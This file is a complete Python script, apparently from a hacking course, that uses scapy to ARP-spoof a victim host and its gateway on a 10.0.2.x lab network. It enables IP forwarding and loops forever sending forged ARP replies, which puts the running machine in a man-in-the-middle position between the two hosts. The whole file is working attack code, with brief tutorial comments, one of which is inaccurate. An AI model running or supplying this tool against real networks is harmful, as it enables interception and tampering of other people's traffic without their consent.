#!/usr/bin//env python
#this is the python 3 version of this tool

import scapy.all as scapy
import time
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

sent_packets_count = 0
while True:
    spoof("10.0.2.4", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.4")
    sent_packets_count = sent_packets_count + 2
    #the comma adds stuff to the buffer and not adding a new line
    #and printing as a dynamic counter
    print("\r[+] Packets sent:" + str (sent_packets_count),end="")
    #flush the buffer
    time.sleep(2)
